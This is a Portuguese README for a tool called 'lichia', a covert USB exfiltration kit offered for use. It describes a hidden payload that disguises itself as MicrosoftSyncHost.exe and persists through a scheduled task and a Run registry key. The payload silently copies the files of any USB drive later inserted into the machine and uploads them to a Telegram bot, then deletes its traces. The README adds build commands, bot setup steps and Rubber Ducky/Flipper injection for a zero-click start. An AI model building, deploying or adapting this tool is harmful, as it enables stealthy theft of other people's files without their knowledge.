# lichia

Exfiltração discreta via pendrive: um pendrive "armadilha" fica escondido;
quando outro pendrive é encaixado no mesmo PC, o conteúdo dele é copiado,
empacotado e enviado para um bot do Telegram.

## arquitetura

```
gui/lichia_gui.py        GUI (Tkinter, tema lichia) — programa o pendrive
payload/LichiaPayload.py watcher + exfil (compilar com PyInstaller)
payload/bootstrap.bat    roda o payload a partir do próprio pendrive
payload/first_stage.duck script HID (Ducky/Flipper) p/ disparo frio em Win10/11
```

Fluxo:
1. pendrive armadilha contém `Lichia\LichiaPayload.exe` + `lichen.config` (ocultos).
2. ao ser encaixado, o payload se copia para `%APPDATA%\Microsoft\Lichia\MicrosoftSyncHost.exe`
   (atributos oculto+sistema), cria tarefa ONLOGON (schtasks) e chave `HKCU…\Run`,
   e passa a vigiar novos drives removíveis (polling a cada 3s, sem janela).
3. pendrive alvo é detectado → todos os arquivos são copiados para cache oculto,
   compactados e enviados ao Telegram (`sendDocument`, multipart puro, chunks de 49MB).
4. cache e zip são apagados ao final.

## build

```
cd payload
pyinstaller --onefile --noconsole --name LichiaPayload LichiaPayload.py
```
Ou use o botão "gerar payload.exe" na GUI.

## uso

1. Crie um bot no @BotFather → pegue o token. Envie qualquer msg ao bot e leia
   `https://api.telegram.org/bot<TOKEN>/getUpdates` para achar o `chat.id`.
2. Abra a GUI, preencha token + chat id, escolha o modo, plugue o pendrive
   armadilha e clique "programar pendrive".
3. Disparo frio (sem clicar em nada): use `first_stage.duck` num Rubber Ducky /
   Flipper Zero / Bash Bunny — em Win10/11 o autorun.inf sozinho não roda.
   Alternativa: rodar `bootstrap.bat` manualmente uma única vez no PC alvo.
4. O botão "testar bot" valida token + chat id antes de gravar nada.

## filtros

- modo `Tudo` → copia qualquer arquivo até `max_mb`.
- modo `Apenas documentos` → somente pdf/doc/xls/ppt/txt/csv/imagens/compactados.
- sempre ignora `System Volume Information`, `$RECYCLE.BIN`, o próprio pendrive
  da lichia e o cache de staging.

## notas

- `.py` direto não serve para instalação — o payload precisa ser compilado
  (PyInstaller) para que `sys.executable` aponte para ele mesmo no pendrive.
- A tarefa agendada se chama `Lichia`; o processo fica como `MicrosoftSyncHost.exe`.
- Sem criptografia de config — trate o token do bot como dado sensível.
